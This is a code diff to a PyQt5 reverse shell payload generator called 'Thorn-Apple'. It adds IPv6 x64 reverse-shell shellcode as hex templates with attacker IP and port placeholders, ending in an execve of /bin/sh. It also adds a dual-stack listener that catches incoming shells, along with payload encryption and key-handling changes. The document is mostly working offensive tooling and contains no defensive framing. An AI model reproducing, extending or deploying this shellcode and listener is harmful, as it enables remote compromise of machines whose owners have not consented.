@@ -27,7 +27,7 @@ from PyQt5.QtWidgets import (
     QFileDialog, QCheckBox, QMessageBox, QSpinBox, QStatusBar, QProgressBar
 )
 from PyQt5.QtCore import Qt, QSize, QThread, pyqtSignal
-from PyQt5.QtGui import QIcon, QFont, QTextCursor, QColor, QPixmap
+from PyQt5.QtGui import QIcon, QFont, QTextCursor, QColor, QPixmap, QGuiApplication
 
 # Constants
 X86_REVERSE_SHELL = (
@@ -41,6 +41,15 @@ X64_REVERSE_SHELL = (
     "4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f05"
     "4989c04831f64d31d24152c604240266c7442402{custom_port}c74424"
     "04{custom_ip}4889e66a105a41505f6a2a580f054889c76a035e6a2158"
+    "0f0548ffce79f64831d248bbff2f62696e2f736848c1eb08534889e748"
+    "31c050574889e6b03b0f05"
+)
+
+# IPv6 shellcode (x64 only for now)
+X64_IPV6_REVERSE_SHELL = (
+    "4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f05"
+    "4989c04831f64d31d24152c604240266c7442402{custom_port}48b8"
+    "{custom_ip}504889e66a105a41505f6a2a580f054889c76a035e6a2158"
     "0f0548ffce79f64831d248bbff2f62696e2f736848c1eb08534889e748"
     "31c050574889e6b03b0f05"
 )
@@ -77,12 +86,13 @@ hZ5jZ5kAiEA6ZA+2zt1oPakuGNXEe3vcFI+3fHvcTdYzO4CuXyZifId/tI=
 
 class ListenerThread(QThread):
     update_signal = pyqtSignal(str)
-    connection_signal = pyqtSignal(str, int)
+    connection_signal = pyqtSignal(str, int, int)
     status_signal = pyqtSignal(str)
 
-    def __init__(self, port, use_ssl=False):
+    def __init__(self, port, ip_version, use_ssl=False):
         super().__init__()
         self.port = port
+        self.ip_version = ip_version  # "IPv4", "IPv6", or "Dual"
         self.running = False
         self.client_socket = None
         self.use_ssl = use_ssl
@@ -92,9 +102,23 @@ class ListenerThread(QThread):
     def run(self):
         self.running = True
         try:
-            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # Handle dual-stack (IPv4 and IPv6)
+            if self.ip_version == "Dual":
+                self.server_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+                self.server_socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
+                bind_addr = '::'
+                version_info = "IPv4/IPv6"
+            elif self.ip_version == "IPv6":
+                self.server_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+                bind_addr = '::'
+                version_info = "IPv6"
+            else:  # IPv4
+                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                bind_addr = '0.0.0.0'
+                version_info = "IPv4"
+                
             self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            self.server_socket.bind(('0.0.0.0', self.port))
+            self.server_socket.bind((bind_addr, self.port))
             self.server_socket.listen(1)
 
             context = None
@@ -113,10 +137,28 @@ class ListenerThread(QThread):
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
 
-            self.update_signal.emit(f"[*] Listening on port {self.port} {'(TLS enabled)' if self.use_ssl else ''}\n")
+            self.update_signal.emit(f"[*] Listening on port {self.port} ({version_info}) {'(TLS enabled)' if self.use_ssl else ''}\n")
             while self.running:
                 try:
                     client_socket, addr = self.server_socket.accept()
+                    addr_ip = addr[0]
+                    addr_port = addr[1]
+                    
+                    # For dual-stack, determine IP version
+                    if self.ip_version == "Dual":
+                        try:
+                            # Check if it's an IPv4-mapped address
+                            if '.' in addr_ip:
+                                ip_version = 4
+                            else:
+                                ip_version = 6
+                        except:
+                            ip_version = 4
+                    elif self.ip_version == "IPv6":
+                        ip_version = 6
+                    else:
+                        ip_version = 4
+                    
                     if self.use_ssl:
                         try:
                             client_socket = context.wrap_socket(
@@ -130,8 +172,8 @@ class ListenerThread(QThread):
                             client_socket.close()
                             continue
                     self.client_socket = client_socket
-                    self.connection_signal.emit(addr[0], addr[1])
-                    self.update_signal.emit(f"[+] Connection established from {addr[0]}:{addr[1]}\n")
+                    self.connection_signal.emit(addr_ip, addr_port, ip_version)
+                    self.update_signal.emit(f"[+] Connection established from {addr_ip}:{addr_port} (IPv{ip_version})\n")
                     while self.running:
                         ready, _, _ = select.select([self.client_socket], [], [], 0.5)
                         if ready:
@@ -140,7 +182,7 @@ class ListenerThread(QThread):
                                 break
                             self.update_signal.emit(data.decode(errors="ignore"))
                 except Exception as e:
-                    if "WinError 10038" not in str(e):  # Ignore socket closed error
+                    if "WinError 10038" not in str(e) and "Bad file descriptor" not in str(e):  # Ignore socket closed errors
                         self.update_signal.emit(f"[!] Listener error: {str(e)}\n")
                     break
         finally:
@@ -161,8 +203,12 @@ class ListenerThread(QThread):
                 pass
         try:
             # Create a temporary connection to unblock accept()
-            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            temp_socket.connect(('127.0.0.1', self.port))
+            if self.ip_version == "IPv6" or self.ip_version == "Dual":
+                temp_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+                temp_socket.connect(('::1', self.port))
+            else:
+                temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                temp_socket.connect(('127.0.0.1', self.port))
             temp_socket.close()
         except:
             pass
@@ -419,7 +465,7 @@ class ReverseShellGenerator(QMainWindow):
         header_layout.addStretch()
         
         # Add version label
-        version_label = QLabel("v2.0")
+        version_label = QLabel("v2.1")
         version_label.setStyleSheet("font-size: 12pt; color: #777;")
         header_layout.addWidget(version_label)
         
@@ -443,6 +489,14 @@ class ReverseShellGenerator(QMainWindow):
         conn_group = QGroupBox("Connection Settings")
         conn_layout = QVBoxLayout()
         conn_layout.setSpacing(15)
+
+        # IP version selection
+        ip_version_layout = QHBoxLayout()
+        ip_version_layout.addWidget(QLabel("IP Version:"))
+        self.ip_version_combo = QComboBox()
+        self.ip_version_combo.addItems(["IPv4", "IPv6"])
+        ip_version_layout.addWidget(self.ip_version_combo)
+        conn_layout.addLayout(ip_version_layout)
 
         lhost_layout = QHBoxLayout()
         lhost_layout.addWidget(QLabel("LHOST:"))
@@ -709,6 +763,13 @@ class ReverseShellGenerator(QMainWindow):
         self.listener_port_input.setPlaceholderText("Port")
         listener_controls.addWidget(self.listener_port_input)
         
+        # Listener IP version
+        listener_controls.addWidget(QLabel("IP Ver:"))
+        self.listener_ip_combo = QComboBox()
+        self.listener_ip_combo.addItems(["IPv4", "IPv6", "Dual"])
+        self.listener_ip_combo.setFixedWidth(80)
+        listener_controls.addWidget(self.listener_ip_combo)
+        
         self.start_listener_btn = QPushButton("Start Listener")
         self.start_listener_btn.setIcon(QIcon.fromTheme("media-playback-start"))
         self.start_listener_btn.clicked.connect(self.toggle_listener)
@@ -784,15 +845,16 @@ class ReverseShellGenerator(QMainWindow):
             if port < 1 or port > 65535:
                 QMessageBox.warning(self, "Invalid Port", "Port must be between 1 and 65535")
                 return
+            ip_version = self.listener_ip_combo.currentText()
             use_ssl = self.ssl_cb.isChecked()
-            self.listener_thread = ListenerThread(port, use_ssl)
+            self.listener_thread = ListenerThread(port, ip_version, use_ssl)
             self.listener_thread.update_signal.connect(self.update_terminal)
             self.listener_thread.connection_signal.connect(self.handle_connection)
             self.listener_thread.status_signal.connect(self.update_status)
             self.listener_thread.start()
             self.start_listener_btn.setText("Stop Listener")
             self.stop_listener_btn.setEnabled(True)
-            self.terminal.append(f"[*] Starting listener on port {port} {'(TLS enabled)' if use_ssl else ''}...")
+            self.terminal.append(f"[*] Starting {ip_version} listener on port {port} {'(TLS enabled)' if use_ssl else ''}...")
         except Exception as e:
             self.terminal.append(f"[!] Error starting listener: {str(e)}")
 
@@ -805,8 +867,8 @@ class ReverseShellGenerator(QMainWindow):
             self.stop_listener_btn.setEnabled(False)
             self.terminal.append("[*] Listener stopped")
 
-    def handle_connection(self, ip, port):
-        self.terminal.append(f"\n[+] Connection from {ip}:{port}")
+    def handle_connection(self, ip, port, version):
+        self.terminal.append(f"\n[+] Connection from {ip}:{port} (IPv{version})")
         self.terminal.append("-" * 50)
 
     def update_terminal(self, text):
@@ -835,12 +897,20 @@ class ReverseShellGenerator(QMainWindow):
         """Validate all user inputs before payload generation"""
         errors = []
         
-        # Validate LHOST
+        ip_version = self.ip_version_combo.currentText()
         lhost = self.lhost_input.text()
-        try:
-            socket.inet_aton(lhost)
-        except socket.error:
-            errors.append("Invalid IP address for LHOST")
+        
+        # Validate LHOST based on IP version
+        if ip_version == "IPv4":
+            try:
+                socket.inet_pton(socket.AF_INET, lhost)
+            except socket.error:
+                errors.append("Invalid IPv4 address for LHOST")
+        else:  # IPv6
+            try:
+                socket.inet_pton(socket.AF_INET6, lhost)
+            except socket.error:
+                errors.append("Invalid IPv6 address for LHOST")
         
         # Validate LPORT
         try:
@@ -904,6 +974,7 @@ class ReverseShellGenerator(QMainWindow):
 
         lhost = self.lhost_input.text()
         lport = self.lport_input.text()
+        ip_version = self.ip_version_combo.currentText()
         encoder = self.encoder_combo.currentText()
         arch = self.arch_combo.currentText()
         platform_os = self.platform_combo.currentText()
@@ -912,7 +983,7 @@ class ReverseShellGenerator(QMainWindow):
         self.progress_bar.setValue(10)
         
         try:
-            shellcode = self.generate_shellcode(lhost, lport, arch, platform_os)
+            shellcode = self.generate_shellcode(lhost, lport, ip_version, arch, platform_os)
             if not shellcode:
                 QMessageBox.critical(self, "Error", "Invalid IP address or port")
                 self.progress_bar.setVisible(False)
@@ -968,28 +1039,50 @@ class ReverseShellGenerator(QMainWindow):
             pass
         return modules
 
-    def generate_shellcode(self, lhost, lport, arch, platform_os):
-        # Validate IP address
-        socket.inet_aton(lhost)
-        
+    def generate_shellcode(self, lhost, lport, ip_version, arch, platform_os):
         # Validate port
         port = int(lport)
         if not (1 <= port <= 65535):
             return None
-
-        # Convert IP to hex
-        ip_parts = lhost.split('.')
-        ip_hex = ''.join([f"{int(part):02x}" for part in ip_parts])
-        
+            
         # Convert port to hex (big-endian)
         port_hex = f"{port:04x}"
         
-        # Select shellcode template
-        if arch == "x86":
-            template = X86_REVERSE_SHELL
-        else:
-            template = X64_REVERSE_SHELL
+        # Convert IP to appropriate format
+        if ip_version == "IPv4":
+            # Validate IPv4 address
+            try:
+                socket.inet_pton(socket.AF_INET, lhost)
+            except socket.error:
+                return None
+                
+            # Convert IPv4 to hex
+            ip_parts = lhost.split('.')
+            ip_hex = ''.join([f"{int(part):02x}" for part in ip_parts])
             
+            # Select shellcode template
+            if arch == "x86":
+                template = X86_REVERSE_SHELL
+            else:
+                template = X64_REVERSE_SHELL
+        else:  # IPv6
+            # Validate IPv6 address
+            try:
+                socket.inet_pton(socket.AF_INET6, lhost)
+            except socket.error:
+                return None
+                
+            # Convert IPv6 to packed binary then to hex
+            ip_bytes = socket.inet_pton(socket.AF_INET6, lhost)
+            ip_hex = binascii.hexlify(ip_bytes).decode()
+            
+            # For IPv6, we only have x64 shellcode for now
+            if arch == "x64":
+                template = X64_IPV6_REVERSE_SHELL
+            else:
+                QMessageBox.warning(self, "Unsupported", "IPv6 is only supported for x64 architecture")
+                return None
+        
         # Replace placeholders
         shellcode_hex = template.replace("{custom_ip}", ip_hex).replace("{custom_port}", port_hex)
         
@@ -1422,11 +1515,23 @@ if __name__ == "__main__":
         return loader_code
 
     def display_results(self, orig_shellcode, enc_shellcode, key, nonce):
+        # Mask the key for display (first 4 and last 4 characters)
+        key_hex = binascii.hexlify(key).decode()
+        masked_key = f"{key_hex[:4]}...{key_hex[-4:]}"
+        
+        # Mask the nonce similarly
+        nonce_hex = binascii.hexlify(nonce).decode()
+        masked_nonce = f"{nonce_hex[:4]}...{nonce_hex[-4:]}"
+        
         result = (
             "=== Thorn-Apple Payload Generation Report ===\n\n"
+            "!!! SECURITY WARNING !!!\n"
+            "The encryption key below provides full access to your payload.\n"
+            "Treat it as highly sensitive material - anyone with this key can decrypt your shellcode.\n\n"
             "Generation Parameters:\n"
             f"LHOST: {self.lhost_input.text()}\n"
             f"LPORT: {self.lport_input.text()}\n"
+            f"IP Version: {self.ip_version_combo.currentText()}\n"
             f"Sleep Time: {self.sleep_time} seconds\n"
             f"Encryption: {self.encoder_combo.currentText()}\n"
             f"Architecture: {self.arch_combo.currentText()}\n"
@@ -1441,8 +1546,8 @@ if __name__ == "__main__":
             "Payload Details:\n"
             f"Original Size: {len(orig_shellcode)} bytes\n"
             f"Encrypted Size: {len(enc_shellcode)} bytes\n"
-            f"Encryption Key: {binascii.hexlify(key).decode()}\n"
-            f"Nonce: {binascii.hexlify(nonce).decode()}\n\n"
+            f"Encryption Key: {masked_key} (full key copied to clipboard)\n"
+            f"Nonce: {masked_nonce}\n\n"
             "=== Selected Advanced Modules ===\n"
         )
         
@@ -1490,6 +1595,11 @@ if __name__ == "__main__":
             result += binascii.hexlify(self.encrypted_shellcode).decode()[:512] + "..."
         
         self.output_text.setPlainText(result)
+        
+        # Copy full key to clipboard securely
+        clipboard = QGuiApplication.clipboard()
+        clipboard.setText(key_hex)
+        self.status_label.setText("Full encryption key copied to clipboard - handle with care!")
     
     def save_payload(self):
         "Save payload to file with appropriate extension"
